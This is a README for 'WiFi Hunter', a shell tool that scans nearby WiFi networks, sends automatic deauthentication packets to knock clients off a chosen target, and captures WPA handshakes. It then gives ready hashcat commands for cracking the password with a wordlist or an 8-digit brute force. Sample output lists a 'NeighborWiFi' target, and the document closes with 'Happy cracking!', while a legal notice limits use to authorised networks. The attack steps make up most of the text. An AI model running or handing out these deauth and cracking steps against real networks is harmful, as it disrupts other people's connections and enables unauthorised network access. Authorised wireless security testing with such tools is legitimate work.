# 🎯 WiFi Hunter - Interactive Handshake Capture Tool

**The easiest way to capture WiFi handshakes with automatic deauth mode!**

## ✨ Features

- 🔍 **Automatic AP Scanning** - Scans and displays all nearby access points
- 📊 **Visual Display** - Shows BSSID, Channel, Power, Encryption, and ESSID in a nice table
- 🎯 **Interactive Selection** - Simple menu to select your target network
- ⚡ **Attack Mode** - Automatically sends deauth packets to force handshakes
- 🔄 **Real-time Monitoring** - Watches for handshakes and alerts you immediately
- 💾 **Auto-Convert** - Converts captures to hashcat format automatically
- 🧹 **Clean Exit** - Properly cleans up and restores your network on exit

## 🚀 Quick Start

```bash
# Make executable (first time only)
chmod +x wifi_hunter.sh

# Run the script
sudo ./wifi_hunter.sh
```

That's it! The script will guide you through everything.

## 📋 How It Works

### Step 1: Interface Selection
```
Available wireless interfaces:
  [1] wlan0

Select interface [1]:
```
Select your wireless interface (usually just press Enter for default).

### Step 2: AP Scanning
```
[*] Scanning for access points...
[*] Scanning for 15 seconds, please wait...
```
The script automatically scans for 15 seconds and finds all nearby networks.

### Step 3: AP Display
```
╔══════════════════════════════════════════════════════════════════════════════╗
║                        Discovered Access Points                             ║
╚══════════════════════════════════════════════════════════════════════════════╝

NUM  BSSID               CH   PWR    ENC    ESSID
────────────────────────────────────────────────────────────────────────────────
[1]  AA:BB:CC:DD:EE:FF   6    -45    WPA2   MyHomeNetwork
[2]  11:22:33:44:55:66   11   -67    WPA2   NeighborWiFi
[3]  FF:EE:DD:CC:BB:AA   1    -82    WPA    OtherNetwork
```

Networks are color-coded:
- 🟢 **Green** = Strong signal (-70 dBm or better)
- 🟡 **Yellow** = Medium signal (-70 to -80 dBm)
- 🔴 **Red** = Weak signal (below -80 dBm)

### Step 4: Target Selection
```
Enter target number [1]: 1

╔═══════════════════ Target Selected ════════════════════╗
║ ESSID   : MyHomeNetwork
║ BSSID   : AA:BB:CC:DD:EE:FF
║ Channel : 6
║ Power   : -45 dBm
║ Encrypt : WPA2
╚════════════════════════════════════════════════════════╝
```

### Step 5: Attack Mode Selection
```
╔══════════════════════════════════════════════════════════════╗
║                      Attack Mode                             ║
╚══════════════════════════════════════════════════════════════╝

Attack mode will automatically send deauth packets to force handshakes.
This disconnects clients briefly, causing them to reconnect.

  [1] Enable attack mode (deauth every 5 seconds)
  [2] Passive mode (wait for natural handshakes)

Select mode [1]:
```

**Attack Mode (Recommended):**
- Automatically sends deauth packets every 5 seconds
- Forces clients to disconnect and reconnect
- Captures the handshake during reconnection
- Much faster than waiting naturally

**Passive Mode:**
- Waits for devices to connect naturally
- No deauth packets sent
- Takes longer but less intrusive

### Step 6: Capture & Monitor
```
╔══════════════════════════════════════════════════════════════╗
║                  Starting Capture                            ║
╚══════════════════════════════════════════════════════════════╝

[*] Target   : MyHomeNetwork (AA:BB:CC:DD:EE:FF)
[*] Channel  : 6
[*] Output   : handshake_MyHomeNetwork_20231103_140532-01.cap
[*] Mode     : Attack (Deauth)

[+] Capture started (PID: 12345)
[+] Deauth attack running (PID: 12346)

╔══════════════════════════════════════════════════════════════╗
║              Monitoring for Handshake...                     ║
╚══════════════════════════════════════════════════════════════╝

Press Ctrl+C to stop capture

[*] Elapsed: 15s | Checks: 3 | Status: Waiting...
```

The script automatically:
- ✅ Captures packets on the target channel
- ✅ Sends deauth attacks (if enabled)
- ✅ Checks for handshakes every 5 seconds
- ✅ Shows elapsed time and check count

### Step 7: Success!
```
[+] Elapsed: 23s | Checks: 5 | Status: HANDSHAKE CAPTURED!

╔══════════════════════════════════════════════════════════════╗
║                  🎉 HANDSHAKE CAPTURED! 🎉                   ║
╚══════════════════════════════════════════════════════════════╝
```

### Step 8: Conversion
```
[*] Verifying handshake...
1 handshake

[+] Handshake verified!

Convert to hashcat format? (y/n) [y]: y
[*] Converting with hcxpcapngtool...
[+] Converted: handshake_MyHomeNetwork_20231103_140532.hc22000

Crack with:
  hashcat -m 22000 handshake_MyHomeNetwork_20231103_140532.hc22000 wordlist.txt

╔═══════════════════ Files Created ══════════════════════╗
║ Capture file : /home/aaron/Projects/change_image/handshake_MyHomeNetwork_20231103_140532-01.cap
║ Hashcat file : /home/aaron/Projects/change_image/handshake_MyHomeNetwork_20231103_140532.hc22000
╚════════════════════════════════════════════════════════╝

[+] All done! Happy cracking! 🔓
```

## 🎮 Usage Tips

### For Best Results:

1. **Get close to the router** - Better signal = better capture
2. **Use attack mode** - Much faster than passive
3. **Ensure clients are connected** - Need at least one device on the network
4. **Be patient** - Sometimes takes 2-3 deauth cycles

### If Handshake Not Captured:

The script will keep trying. If it takes too long:
1. Press `Ctrl+C` to stop
2. Run the script again
3. Try a different target (one with more clients)
4. Make sure you're close enough (strong signal)

## 🔓 Cracking the Handshake

After capturing, crack with hashcat:

```bash
# Using a wordlist
hashcat -m 22000 handshake_MyNetwork.hc22000 /usr/share/wordlists/rockyou.txt

# Brute force 8 digits
hashcat -m 22000 handshake_MyNetwork.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Show cracked password
hashcat -m 22000 handshake_MyNetwork.hc22000 --show
```

## 🛠️ Requirements

```bash
# Install dependencies
sudo apt update
sudo apt install -y aircrack-ng hcxtools hashcat

# Optional but recommended
sudo apt install -y wireless-tools net-tools
```

## ⚙️ Script Options

The script handles everything automatically, but you can customize:

- **Interface**: Select which wireless card to use
- **Attack Mode**: Enable/disable automatic deauth
- **Conversion**: Choose whether to convert to hashcat format

## 🔄 What Happens Behind the Scenes

1. **Monitor Mode**: Enables monitor mode on your wireless interface
2. **AP Scan**: Uses `airodump-ng` to scan for 15 seconds
3. **Parse Results**: Extracts BSSID, Channel, Power, ESSID from scan
4. **Target Capture**: Starts `airodump-ng` on specific channel/BSSID
5. **Deauth Attack** (if enabled): Runs `aireplay-ng` in background
6. **Monitor Loop**: Checks capture file every 5 seconds with `aircrack-ng`
7. **Cleanup**: Stops monitor mode, kills processes, removes temp files

## 🧹 Cleanup

The script automatically cleans up when you:
- Press `Ctrl+C`
- Complete a capture
- Exit the script

It will:
- ✅ Stop all background processes
- ✅ Disable monitor mode
- ✅ Restart NetworkManager
- ✅ Remove temporary files

## ⚠️ Legal Notice

**Only use on networks YOU OWN or have explicit written authorization to test.**

✅ **Legal Uses:**
- Your home network
- Client networks with written permission
- Lab/test environments you control
- Educational purposes in authorized settings

❌ **Illegal Uses:**
- Neighbor's WiFi
- Public networks
- Any unauthorized network

Unauthorized access = **Federal crime** (CFAA, Computer Misuse Act, etc.)

## 🐛 Troubleshooting

### "No wireless interfaces found"
- Your wireless card may not be detected
- Try: `iwconfig` to see if it appears
- Check: `lsusb` or `lspci` to verify hardware

### "Failed to enable monitor mode"
- Your card may not support monitor mode
- Try: `iw list | grep monitor`
- Some drivers don't support monitor mode

### "No access points found"
- Move closer to WiFi routers
- Try scanning longer (edit script: increase sleep time)
- Check antenna is connected properly

### Handshake won't capture
- **No clients connected**: Need active devices on network
- **Too far away**: Move closer to router
- **Protected network**: Some routers have deauth protection (802.11w)
- **Try more deauths**: The script sends them automatically, but be patient

### "hcxpcapngtool not found"
```bash
sudo apt install hcxtools
```

## 📚 Additional Resources

- **Aircrack-ng**: https://aircrack-ng.org/
- **Hashcat**: https://hashcat.net/
- **Wordlists**: https://github.com/danielmiessler/SecLists

## 🎯 Example Session

```bash
$ sudo ./wifi_hunter.sh

╔══════════════════════════════════════════════════════════════╗
║                      WiFi Hunter v1.0                        ║
║              Handshake Capture & Deauth Tool                 ║
╚══════════════════════════════════════════════════════════════╝

[*] Detecting wireless interfaces...
Available wireless interfaces:
  [1] wlan0

Select interface [1]:

[*] Enabling monitor mode on wlan0...
[+] Monitor mode enabled: wlan0mon

[*] Scanning for access points...
[*] Scanning for 15 seconds, please wait...
[*] Progress: [15/15] ###############

[+] Found 3 access points

NUM  BSSID               CH   PWR    ENC    ESSID
────────────────────────────────────────────────────────────────
[1]  AA:BB:CC:DD:EE:FF   6    -45    WPA2   MyHomeNetwork
[2]  11:22:33:44:55:66   11   -67    WPA2   TestNetwork
[3]  FF:EE:DD:CC:BB:AA   1    -82    WPA    WeakSignal

Enter target number [1]: 1

╔═══════════════════ Target Selected ════════════════════╗
║ ESSID   : MyHomeNetwork
║ BSSID   : AA:BB:CC:DD:EE:FF
║ Channel : 6
║ Power   : -45 dBm
║ Encrypt : WPA2
╚════════════════════════════════════════════════════════╝

Select mode [1]: 1
[+] Attack mode enabled

[+] Capture started (PID: 12345)
[+] Deauth attack running (PID: 12346)

[*] Elapsed: 18s | Checks: 4 | Status: HANDSHAKE CAPTURED!

╔══════════════════════════════════════════════════════════════╗
║                  🎉 HANDSHAKE CAPTURED! 🎉                   ║
╚══════════════════════════════════════════════════════════════╝

[+] Handshake verified!

Convert to hashcat format? (y/n) [y]: y
[+] Converted: handshake_MyHomeNetwork_20231103_140532.hc22000

Crack with:
  hashcat -m 22000 handshake_MyHomeNetwork_20231103_140532.hc22000 wordlist.txt

[+] All done! Happy cracking! 🔓
```

---

**Made with ❤️ for security researchers and network administrators**
